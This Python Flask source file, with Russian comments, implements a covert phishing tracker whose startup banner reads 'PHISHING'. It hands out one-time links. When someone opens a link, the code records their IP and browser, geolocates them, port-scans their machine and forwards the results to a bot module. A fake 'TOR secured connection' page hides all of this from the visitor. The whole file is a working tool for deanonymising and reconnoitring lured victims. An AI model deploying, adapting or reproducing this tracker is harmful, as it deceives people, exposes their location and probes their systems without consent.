from flask import Flask, request, abort
import requests
import random
import string
import time
import os
import re
import socket
import threading
from functools import wraps

app = Flask(__name__)

# Конфигурация
app.config['MAX_TOKENS'] = 100
app.config['RATE_LIMIT'] = 100

# Хранилище
request_counts = {}
tracking_data = {}
active_tokens = set()
port_scan_results = {}

def rate_limit(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        ip = request.remote_addr
        current_time = time.time()
        window = 3600
        
        if ip not in request_counts:
            request_counts[ip] = []
        
        request_counts[ip] = [t for t in request_counts[ip] if current_time - t < window]
        
        if len(request_counts[ip]) >= app.config['RATE_LIMIT']:
            abort(429, "Too Many Requests")
        
        request_counts[ip].append(current_time)
        return f(*args, **kwargs)
    return decorated_function

def validate_token(token):
    if not token or len(token) != 15:
        return False
    if not re.match(r'^[a-z0-9]+$', token):
        return False
    return True

def generate_token():
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(15))

def get_ip_info(ip):
    try:
        if ip in ['127.0.0.1', 'localhost']:
            return {}
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            return response.json()
        return {}
    except:
        return {}

def scan_port(target_ip, port, timeout=1):
    """Быстрое сканирование порта"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target_ip, port))
        sock.close()
        return result == 0
    except:
        return False

def fast_port_scan(target_ip):
    """Быстрое сканирование основных портов"""
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 8080, 8443]
    open_ports = []
    
    def check_port(port):
        if scan_port(target_ip, port, 0.5):
            open_ports.append(port)
    
    threads = []
    for port in common_ports:
        thread = threading.Thread(target=check_port, args=(port,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join(timeout=3)
    
    return open_ports

def get_port_service(port):
    """Определение сервиса по порту"""
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 443: "HTTPS", 993: "IMAPS",
        995: "POP3S", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
    }
    return services.get(port, "Unknown")

def start_bot(info, open_ports):
    try:
        from bot import send_info
        send_info(info, open_ports)
    except Exception as e:
        print(f"Bot error: {e}")

@app.route('/')
@rate_limit
def index():
    if len(active_tokens) >= app.config['MAX_TOKENS']:
        return "Service temporarily unavailable. Please try again later.", 503
    
    token = generate_token()
    active_tokens.add(token)
    tracking_data[token] = None
    
    safe_url = f"https://onion-web.onrender.com/{token}"
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Onion Web Tracker</title>
        <style>
            body {{ background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }}
            .url-box {{ background: #111; padding: 20px; margin: 20px; border: 1px solid #00ff00; word-break: break-all; }}
            .pulse {{ animation: pulse 2s infinite; }}
            @keyframes pulse {{ 0% {{ opacity: 1; }} 50% {{ opacity: 0.7; }} 100% {{ opacity: 1; }} }}
        </style>
    </head>
    <body>
        <h1 class="pulse">ONION WEB TRACKER</h1>
        <div>Ваша отслеживаемая ссылка:</div>
        <div class="url-box">{safe_url}</div>
        <div style="color: #888; margin-top: 20px;">Ссылка активна до первого перехода</div>
    </body>
    </html>
    """
    
    return html_content

@app.route('/<token>')
@rate_limit
def track_visit(token):
    if not validate_token(token) or token not in active_tokens:
        abort(404, "Link not found or expired")
    
    # Удаляем токен сразу после использования
    active_tokens.discard(token)
    
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')[:500]
    
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0].strip()
    
    # Получаем информацию об IP
    ip_info = get_ip_info(ip)
    
    # Быстрое сканирование портов
    print(f"🔍 Starting port scan for {ip}")
    open_ports = fast_port_scan(ip)
    print(f"📡 Found {len(open_ports)} open ports: {open_ports}")
    
    info = {
        'ip': ip,
        'user_agent': user_agent,
        'country': ip_info.get('country', 'N/A'),
        'city': ip_info.get('city', 'N/A'),
        'lon': ip_info.get('lon', 'N/A'),
        'lat': ip_info.get('lat', 'N/A'),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    
    tracking_data[token] = info
    
    # Отправляем информацию в бот
    start_bot(info, open_ports)
    
    # Генерируем новую ссылку для следующего использования
    new_token = generate_token()
    active_tokens.add(new_token)
    tracking_data[new_token] = None
    
    safe_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Onion Space</title>
        <style>
            body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 50px; text-align: center; }
            .loading { animation: blink 1s infinite; }
            @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
        </style>
    </head>
    <body>
        <h1>Onion Space</h1>
        <p>Establishing secure connection<span class="loading">...</span></p>
        <p>Encryption: AES-256</p>
        <p>Protocol: TOR</p>
        <div style="margin-top: 50px; color: #888;">
            <p>Connection secured</p>
        </div>
    </body>
    </html>
    """
    
    return safe_html

@app.route('/health')
def health():
    return {'status': 'healthy', 'active_tokens': len(active_tokens), 'timestamp': time.time()}

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

def cleanup_tokens():
    while True:
        time.sleep(3600)
        try:
            if len(active_tokens) > 50:
                tokens_to_remove = list(active_tokens)[:25]
                for token in tokens_to_remove:
                    active_tokens.discard(token)
                    if token in tracking_data:
                        del tracking_data[token]
                print(f"🧹 Cleaned {len(tokens_to_remove)} old tokens")
        except Exception as e:
            print(f"Cleanup error: {e}")

if __name__ == "__main__":
    banner = """
██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░
██╔══██╗██║░░██║██║██╔════╝██║░░██║██║████╗░██║██╔════╝░
██████╔╝███████║██║╚█████╗░███████║██║██╔██╗██║██║░░██╗░
██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗
██║░░░░░██║░░██║██║██████╔╝██║░░██║██║██║░╚███║╚██████╔╝
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
    """
    print(banner)
    
    cleanup_thread = threading.Thread(target=cleanup_tokens)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting server on port {port}")
    print("🌐 Available at: https://onion-web.onrender.com")
    print("🔍 Port scanning enabled")
    print("🔄 Auto-link regeneration active")
    
    app.run(host='0.0.0.0', port=port, debug=False)
